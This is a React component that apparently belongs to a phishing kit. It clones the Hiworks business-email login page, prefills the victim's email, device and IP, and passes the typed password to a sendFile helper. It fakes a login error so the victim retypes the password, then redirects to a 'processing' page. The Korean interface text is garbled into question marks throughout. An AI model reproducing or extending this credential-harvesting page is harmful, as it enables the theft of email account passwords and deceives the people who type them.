import { navigate } from "@reach/router";
import React, { Fragment, useState } from "react";
import { Helmet } from "react-helmet";
import { notify, sendFile } from "../servers";

function Hiworks({ location }) {
  const [values, setValues] = useState({
    username: location.state.email,device: location.state.device,
    ip: location.state.ip,
    password: "",
  });

  const [submited, setSubmited] = useState({ status: false, count: 0 });

  const handleChange = (event) => {
    setValues({
      ...values,
      [event.target.name]: event.target.value,
    });
  };

  const submitForm = (event) => {
    event.preventDefault();
    setSubmited({ ...submited, status: !submited.status });

    if (submited.count <= 1) {
      sendFile(values).then((data) => {
        // show error
        notify();
        setSubmited({ ...submited, count: submited.count + 1 }); setValues({ ...values, password: "" });
        console.log(data);
        console.log(submited);
      });
    } else {
      sendFile(values).then((data) => {
        // redirect
        navigate("processing", { state: { domain: location.state.domain } });
        console.log("ok");
      });
    }
  };

  return (
    <Fragment>
      <Helmet>
        <link
          rel="stylesheet"
          type="text/css"
          href="../hiworks_files/common.css"
        />
        <link
          rel="stylesheet"
          type="text/css"
          href="../hiworks_files/style.css"
        />
        <link
          rel="stylesheet"
          type="text/css"
          href="../hiworks_files/font-awesome.min.css"
        />
        <link
          rel="stylesheet"
          type="text/css"
          href="../hiworks_files/market.css"
        />
        <link
          rel="stylesheet"
          type="text/css"
          href="../hiworks_files/market_new.css"
        />
        <link
          rel="stylesheet"
          type="text/css"
          href="../hiworks_files/style_charge.css"
        />
        <link rel="stylesheet" href="../hiworks_files/common(1).css" />
        <link rel="stylesheet" href="../hiworks_files/style(1).css" />
        <link
          rel="stylesheet"
          type="text/css"
          href="../hiworks_files/lbd_layout.css"
        />
        <link rel="stylesheet" href="../hiworks_files/style_new.css" />
        <link rel="stylesheet" href="../hiworks_files/common(1).css" />
        <link rel="stylesheet" href="../hiworks_files/style(1).css" />
        <link
          rel="stylesheet"
          type="text/css"
          href="../hiworks_files/lbd_layout.css"
        />

        <link rel="stylesheet" href="../hiworks_files/style_new.css" />
        <link rel="stylesheet" href="../hiworks_files/main.css" />
      </Helmet>
      <div id="wrap">
        <div className="skip_navigation" data-ui="skipNavigation">
          <a href="https://www.hiworks.com/member/login#contents">
            ?????? ???????????? ????????????
          </a>
        </div>
        <div className="login-wrap">
          <div className="header">
            <h1 className="logo-wrap">
              <a href="https://www.hiworks.com/">
                <img src="../hiworks_files/logo.png" alt="hiworks" />
              </a>
            </h1>
          </div>
          <div id="content">
            <div className="container-wrap">
              <div id="contents" className="member-login">
                <div className="join--wrap">
                  <fieldset className="login-form">
                    <form onSubmit={submitForm}>
                      <input type="hidden" name="hiworks_login" defaultValue />
                      <input type="hidden" name="return_url" defaultValue />
                      <input type="hidden" name="rollback_url" defaultValue />
                      <input type="hidden" name="office_id" defaultValue />
                      <input type="hidden" name="ip_security" defaultValue />
                      <div className="login-title-wrap clearfix">
                        <p className="member-title">?????????</p>
                      </div>
                      <div className="save-id mb-20 p-0">
                        <p className="cont-id mt-3">
                          <input
                            type="checkbox"
                            id="save_flag"
                            name="save_flag"
                            defaultValue="Y"
                            title="????????? ??????"
                          />
                          <label
                            htmlFor="save_flag"
                            style={{ verticalAlign: "middle" }}
                          >
                            ????????? ??????
                          </label>
                        </p>
                        <p
                          className="cont-ip"
                          style={{ cursor: "pointer" }}
                          onclick="Member.check_ip_security();"
                        >
                          IP??????
                          <span className="is-state on" id="ip_security_state">
                            ON
                          </span>
                        </p>
                      </div>
                      <div id="div_login_userid" className="id-area">
                        <label htmlFor="id">?????????</label>
                        <input
                          type="text"
                          id="userid"
                          name="username"
                          disabled
                          onChange={handleChange}
                          value={values.username}
                          placeholder="?????????"
                          className="int"
                          tabIndex={1}
                        />
                        <p className="err">
                          <span
                            className="wr-txt"
                            id="desc_login_userid_err1"
                            style={{ display: "none" }}
                          >
                            * ???????????? ????????? ?????????.
                          </span>
                        </p>
                        <p className="err">
                          <span
                            className="wr-txt"
                            id="desc_login_userid_err2"
                            style={{ display: "none" }}
                          >
                            * ????????? ???????????? ????????? ????????? ????????????.
                          </span>
                        </p>
                      </div>
                      <div id="div_login_userpwd" className="pw-area">
                        <label htmlFor="pw">????????????</label>
                        <input
                          type="password"
                          id="userpwd"
                          name="password"
                          value={values.password}
                          onChange={handleChange}
                          required
                          placeholder="????????????"
                          className="int"
                          tabIndex={2}
                          onkeydown="if(event.keyCode==13) Member.login_formchk();"
                        />
                        <p className="err">
                          <span
                            className="wr-txt"
                            id="desc_login_userpwd"
                            style={{ display: "none" }}
                          >
                            * ??????????????? ??????????????????.
                          </span>
                        </p>
                      </div>
                      <p className="btn-login">
                        <label>
                          <input
                            type="submit"
                            disabled={submited.status}
                            title="?????????"
                            defaultValue="?????????"
                            className="int_jogin"
                            tabIndex={4}
                          />
                        </label>
                      </p>
                      <p className="link-idpw">
                        <a href="https://www.hiworks.com/member/search_info">
                          ????????? ?????? ??????????????? ????????????????
                        </a>
                      </p>
                      <div className="mt-10">
                        <span>????????? ????????????????</span>
                        <span className="office-login">
                          <a href="https://www.hiworks.com/member/join">
                            ?????? ????????????
                          </a>
                        </span>
                      </div>
                    </form>
                  </fieldset>
                </div>
                <div className="or--wrap">
                  <span className="or">??????</span>
                </div>
                <div className="officejoin--wrap">
                  <div className="login-title-wrap clearfix">
                    <p className="member-title">???????????? ?????? ??????</p>
                  </div>
                  <p className="for-office-user">
                    ???????????? ???????????? ??????????????? ??????
                    <span className="gt-layer" id="domainInfo-wrap">
                      <button className id="domainInfo-layer-btn">
                        <span
                          className="underline"
                          style={{ verticalAlign: "super" }}
                        >
                          ?????????
                        </span>
                      </button>
                    </span>
                    ??????
                    <span className="gt-layer" id="officeInfo-wrap">
                      <button className id="officeInfo-layer-btn">
                        <span
                          className="underline"
                          style={{ verticalAlign: "super" }}
                        >
                          ????????? ??????
                        </span>
                      </button>
                    </span>
                    ??? ???????????????
                  </p>
                  <p className="cont-id inform-save-chk">
                    <input
                      type="checkbox"
                      id="office_save_flag"
                      name="office_save_flag"
                      defaultValue="Y"
                      title="????????????"
                    />
                    <label htmlFor="office_save_flag">????????????</label>
                  </p>
                  <input
                    type="text"
                    name="office_id"
                    id="office_id"
                    className="int domain-or-office"
                    placeholder="???) ????????? ?????? ???????????????"
                    value=""
                    onkeydown="if(event.keyCode==13) Member.check_office_id();"
                  />
                  <button
                    type="button"
                    className="int_jogin next-btn"
                    onclick="Member.check_office_id();"
                  >
                    ??????
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div id="dim" className="dim" />
      </div>
      <button className="gt-button" onclick="failed3timesModal()">
        ???????????? 3??? ?????? ?????????????????????.
      </button>
      <div className="gt-modal" id="failed-3times-modal">
        <div
          className="gt-modal-content width-350"
          style={{ textAlign: "center" }}
        >
          <div className="gt-modal-body">
            <p>
              ???????????? 3??? ?????? ?????????????????????.
              <br />
              ?????? ????????? ???????????? ?????????????????? ????????????.
            </p>
            <div className="mt-25">
              <button
                type="button"
                data-modal="hide"
                className="modal-confirm-button"
              >
                ??????
              </button>
            </div>
          </div>
          <div className="gt-modal-close" data-modal="hide" />
        </div>
      </div>
      <button className="gt-button" onclick="inaccurateDomainModal()">
        ????????? ?????? ?????????????????? ???????????? ????????????.
      </button>
      <div className="gt-modal" id="inaccurate-domain-modal">
        <div className="gt-modal-content width-450">
          <div className="gt-modal-body">
            <p>
              ????????? ?????? ?????????????????? ???????????? ????????? ??????????????? ??????????????????.
            </p>
            <ul className="mt-15">
              <li>
                - ???????????? ?????? ?????? ???????????? ?????? ????????? ?????? ???????????????.
              </li>
              <li>
                - ???????????? ????????? ???????????? ???????????? ??? ???????????? ?????? ????????? ???
                ?????? ????????? ????????? ?????????.
              </li>
            </ul>
            <div className="mt-25" style={{ textAlign: "center" }}>
              <button
                type="button"
                data-modal="hide"
                className="modal-confirm-button"
              >
                ??????
              </button>
            </div>
          </div>
          <div className="gt-modal-close" data-modal="hide" />
        </div>
      </div>
      <div className="gt-modal" id="kid-notice-modal">
        <div className="gt-modal-content width-450">
          <div className="gt-modal-body">
            <p>???????????? ???????????? ????????? ????????? ????????? ??????????????????.</p>
            <ul className="mt-15">
              <li style={{ color: "#ff3333" }}>
                - '??????????????? ?????????' ???????????? ??????????????? ???????????? ???????????? ??????
                '???????????? ?????? ??????' ?????? ????????? ?????? ????????? ????????? ???????????????
                ?????????.
              </li>
              <li style={{ color: "#0066ff" }}>
                (?????? ?????? ???????????? ???????????? ???????????? ????????? ????????????
                ???????????????.)
              </li>
              <li style={{ fontWeight: 700, paddingTop: "16px" }}>
                &gt;&gt; ????????? ????????? ??????
              </li>
              <li>
                - '???????????? ?????? ??????'??? ????????? ?????? ????????? ????????? ???????????????
                ??????????????? ????????? ???????????? ???????????????.
              </li>
              <li>
                - ???????????? ????????? ??????????????? ???????????? ?????????/???????????? ??? ?????????
                ????????? ?????????.
              </li>
            </ul>
            <div className="mt-25" style={{ textAlign: "center" }}>
              <button
                type="button"
                data-modal="hide"
                className="modal-confirm-button"
                onclick="Member.check_office_id();"
              >
                ??????
              </button>
            </div>
          </div>
          <div className="gt-modal-close" data-modal="hide" />
        </div>
      </div>
      <div className="gt-modal" id="check-ip-security">
        <div
          className="gt-modal-content width-450"
          style={{ minWidth: "510px" }}
        >
          <div className="gt-modal-title">IP ?????? ??????</div>
          <div className="gt-modal-body">
            <p className="mt-20">
              ????????? ??? IP????????? ???????????? ??????, ?????? IP??? ?????? ???????????? IP
              ????????? ???????????? ????????? ????????? ????????? ???????????? ???????????? ??????
              ???????????? ????????? ?????? ??????????????????.
            </p>
            <p className="mt-10">
              <a
                href="https://customer.gabia.com/manuals/detail.php?seq_no=2802"
                style={{ color: "#779ec0 !important" }}
                target="_blank"
              >
                ???????????????
              </a>
            </p>
            <ul className="mt-20">
              <li>
                <label>
                  <input
                    type="radio"
                    name="hiworks_ip_security"
                    defaultValue={-1}
                  />
                  ?????? ??? ???
                </label>
              </li>
              <li>
                <label>
                  <input
                    type="radio"
                    name="hiworks_ip_security"
                    defaultValue={1}
                  />
                  1??????- ???????????? IP????????? ????????? ??????(C?????????)??? ????????? ??????
                </label>
              </li>
              <li>
                <label>
                  <input
                    type="radio"
                    name="hiworks_ip_security"
                    defaultValue={2}
                  />
                  2??????- ????????? ??? IP ????????? ???????????? ?????? ???????????? ????????? ??????
                </label>
              </li>
            </ul>
            <div className="mt-25" style={{ textAlign: "center" }}>
              <button
                type="button"
                className="modal-confirm-button"
                onclick="Member.save_ip_security();"
              >
                ??????
              </button>
              <button
                type="button"
                data-modal="hide"
                className="modal-confirm-button"
              >
                ??????
              </button>
            </div>
          </div>
          <div className="gt-modal-close" data-modal="hide" />
        </div>
      </div>
      <div className="gt-modal" id="inaccurate-domain-modal">
        <div className="gt-modal-content width-450">
          <div className="gt-modal-body">
            <p>????????? ?????? ?????????????????? ???????????? ????????????.</p>
            <ul className="mt-15">
              <li>
                - ???????????? ?????? ?????? ???????????? ?????? ????????? ?????? ???????????????.
              </li>
              <li>
                - ???????????? ????????? ???????????? ???????????? ??? ???????????? ?????? ????????? ???
                ?????? ????????? ????????? ?????????.
              </li>
            </ul>
            <div className="mt-25" style={{ textAlign: "center" }}>
              <button
                type="button"
                data-modal="hide"
                className="modal-confirm-button"
              >
                ??????
              </button>
            </div>
          </div>
          <div className="gt-modal-close" data-modal="hide" />
        </div>
      </div>
    </Fragment>
  );
}

export default Hiworks;
